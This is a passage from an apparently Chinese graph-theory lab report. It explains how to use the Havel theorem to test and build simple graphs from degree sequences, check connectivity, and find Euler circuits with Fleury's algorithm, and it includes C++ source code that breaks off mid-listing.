<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112132128186.png" alt="image-20211213211759825" style="zoom:80%;" /></p>
<p>接着使用<strong>Havel的等价定理</strong></p>
<ul>
<li><code>d1 + d2 + … + dn = 0 (mod 2)</code></li>
<li><code>d1 + d2 + … + dr ≤ r(r-1) + min(r,dr+1) + min(r,dr+2) + … + min(r,dn)</code></li>
</ul>
<p>满足以上二条件，则可简单图化</p>
<ol>
<li>Havel定理分步求简单图</li>
</ol>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112132110586.png" alt="image-20211213203334582" style="zoom:50%;" /></p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112132128323.png" alt="image-20211213211824476" style="zoom:80%;" /></p>
<ol>
<li>Havel定理构造简单图，用邻接矩阵表示，采用贪心思想构造出最简的简单图</li>
</ol>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112132120857.png" alt="image-20211213211943636" style="zoom:50%;" /></p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112132128343.png" alt="image-20211213211959581" style="zoom:80%;" /></p>
<ol>
<li>求从1 ~ n-1的邻接矩阵幂之和B~n-1~，若B~n-1~中不存在0，则说明n个节点都<strong>至少存在一条长度为1 ~ n-1的通路到另一节点</strong>，说明图连通，反之说明不连通</li>
</ol>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112132130615.png" alt="image-20211213213037009" style="zoom:50%;" /></p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112132129151.png" alt="image-20211213212951285" style="zoom:80%;" /></p>
<ol>
<li>如果图连通，检查度数列，记录奇数顶点数，若存在奇数顶点，则说明不存在欧拉回路，若没有奇数顶点，再进行下一步判断</li>
</ol>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112132132669.png" alt="image-20211213213128768" style="zoom:50%;" /></p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112132132566.png" alt="image-20211213213235140" style="zoom:80%;" /></p>
<ol>
<li>Fleury算法求欧拉回路，如非不要不走割边，搜索不是割边的边并扩展，如果没有点可以扩展，输出并出栈，否则 dfs 继续搜索欧拉路径</li>
</ol>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112132135603.png" alt="image-20211213213408892" style="zoom:50%;" /></p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112132135491.png" alt="image-20211213213541720" style="zoom:80%;" /></p>
<ol>
<li>程序结束</li>
</ol>
<h2 id="实验测试数据、代码及相关结果分析"><a href="#实验测试数据、代码及相关结果分析" class="headerlink" title="实验测试数据、代码及相关结果分析"></a>实验测试数据、代码及相关结果分析</h2><h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><p>程序代码如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">50</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> id, degree;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(Node a, Node b)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a.degree &gt; b.degree;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> tem[maxn][maxn];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="keyword">bool</span> canSimpleGraphRealization;</span><br><span class="line">	<span class="keyword">bool</span> isConnected;</span><br><span class="line"></span><br><span class="line">	Node* node = <span class="keyword">new</span> Node[maxn];</span><br><span class="line">	<span class="keyword">int</span> stk[maxn];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="keyword">int</span> top;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> adjMatrix[maxn][maxn];</span><br><span class="line">	<span class="keyword">int</span> sumLink[maxn][maxn];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//constructor</span></span><br><span class="line">	<span class="built_in">solution</span>(<span class="keyword">int</span> n) &#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;n = n;</span><br><span class="line">		<span class="keyword">this</span>-&gt;canSimpleGraphRealization = <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">this</span>-&gt;isConnected = <span class="literal">true</span>;</span><br><span class="line">		<span class="built_in">memset</span>(adjMatrix, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(adjMatrix));</span><br><span class="line">		<span class="built_in">memset</span>(sumLink, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(sumLink));</span><br><span class="line">		<span class="built_in">memset</span>(tem, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(tem));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	~<span class="built_in">solution</span>() &#123;</span><br><span class="line">		<span class="keyword">delete</span>[] node;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(Node* node)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">initialList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;#==========读入度数序列&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			cin &gt;&gt; node[i].degree;</span><br><span class="line">			node[i].id = i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">copyList</span><span class="params">(Node* targetNode)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			targetNode[i].degree = node[i].degree;</span><br><span class="line">			targetNode[i].id = node[i].id;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">checkGraphRealization</span><span class="params">(Node* node, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">Havel</span><span class="params">(Node* node, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">bool</span> <span class="title">allZERO</span><span class="params">(Node* node, <span class="keyword">int</span> s, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">bool</span> <span class="title">buildSimpleGraph</span><span class="params">(Node* node, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">checkConnected</span><span class="params">(Node* node, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">clearTemLink</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">fleury</span><span class="params">(<span class="keyword">int</span> startIndex)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//displaydegree</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solution::display</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;degree[&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;]&quot;</span> &lt;&lt; <span class="string">&quot;= &quot;</span> &lt;&lt; node[i].degree &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solution::checkGraphRealization</span><span class="params">(Node* node, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;#==========判断是否可图化/可简单图化&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//先判断是否可图化</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		sum += node[i].degree;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sum % <span class="number">2</span>) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;不可图化，亦不可简单图化&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//如果可图化，继续判断是否可简单图化</span></span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;可图化&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">sort</span>(node + <span class="number">1</span>, node + n + <span class="number">1</span>, cmp);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//先判断最大度是否小于等于n-1</span></span><br><span class="line">	<span class="keyword">if</span> (node[<span class="number">0</span>].degree &gt; n - <span class="number">1</span>) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;,不可简单图化&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> r = <span class="number">1</span>; r &lt;= n; r++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">1</span>; index &lt;= r; index++)</span><br><span class="line">			&#123;</span><br><span class="line">				left += node[index].degree;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">int</span> right = r * (r - <span class="number">1</span>);</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> index = r + <span class="number">1</span>; index &lt;= n; index++)</span><br><span class="line">			&#123;</span><br><span class="line">				right += <span class="built_in">min</span>(r, node[index].degree);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">//如果不满足</span></span><br><span class="line">			<span class="keyword">if</span> (left &gt; right) &#123;</span><br><span class="line">				cout &lt;&lt; <span class="string">&quot;,不可简单图化&quot;</span> &lt;&lt; endl;</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//如果都没问题，则可以简单图化</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;,可简单图化&quot;</span> &lt;&lt; endl;</span><br><span class="line">	canSimpleGraphRealization = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solution::Havel</span><span class="params">(Node* node, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;#==========Havel定理求对应简单图&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	Node* fakeNode = <span class="keyword">new</span> Node[n+<span class="number">1</span>];</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">copyList</span>(fakeNode);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> lptr, rptr;</span><br><span class="line">	lptr = <span class="number">1</span>;</span><br><span class="line">	rptr = n;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;(&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = lptr; i &lt;= rptr; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; fakeNode[i].degree;</span><br><span class="line">		<span class="keyword">if</span> (i != rptr) cout &lt;&lt; <span class="string">&quot;, &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;可简单图化&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">allZERO</span>(fakeNode, lptr, rptr))</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//cout &lt;&lt; endl &lt;&lt; &quot;lptr=&quot; &lt;&lt; lptr &lt;&lt; endl;</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = lptr + <span class="number">1</span>; i &lt;= lptr + fakeNode[lptr].degree; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			fakeNode[i].degree -= <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment">//cout &lt;&lt; &quot;before &quot;;</span></span><br><span class="line">		<span class="comment">//display();</span></span><br><span class="line"></span><br><span class="line">		<span class="built_in">sort</span>(fakeNode+<span class="number">1</span>+lptr, fakeNode+<span class="number">1</span>+n, cmp);</span><br><span class="line"></span><br><span class="line">		lptr++;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//cout &lt;&lt; &quot;after &quot;;</span></span><br><span class="line">		<span class="comment">//display();</span></span><br><span class="line"></span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;&lt;=&gt;&quot;</span>;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;(&quot;</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = lptr; i &lt;= rptr; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			cout &lt;&lt; fakeNode[i].degree;</span><br><span class="line">			<span class="keyword">if</span> (i != rptr) cout &lt;&lt; <span class="string">&quot;, &quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;)&quot;</span>;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;可简单图化&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">delete</span>[] fakeNode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">solution::allZERO</span><span class="params">(Node* node, <span class="keyword">int</span> s, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = s; i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		sum += node[i].degree;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!sum)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">solution::buildSimpleGraph</span><span class="params">(Node* node, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;#==========Havel定理构造对应简单图(邻接矩阵)&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	Node* fakeNode = <span class="keyword">new</span> Node[n + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">copyList</span>(fakeNode);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//display(fakeNode);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">sort</span>(fakeNode + i, fakeNode + n + <span class="number">1</span>, cmp);</span><br><span class="line">		<span class="keyword">if</span> (fakeNode[i].degree &gt; n - i) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt;= i + fakeNode[i].degree; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (!fakeNode[j].degree) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">			fakeNode[j].degree--;</span><br><span class="line">			adjMatrix[fakeNode[i].id][fakeNode[j].id] = <span class="number">1</span>;</span><br><span class="line">			adjMatrix[fakeNode[j].id][fakeNode[i].id] = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		fakeNode[i].degree = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;index&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>, i);</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>, i);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>, adjMatrix[i][j]);</span><br><span class="line">		&#125;			</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">	&#125;	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">delete</span>[] fakeNode;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span 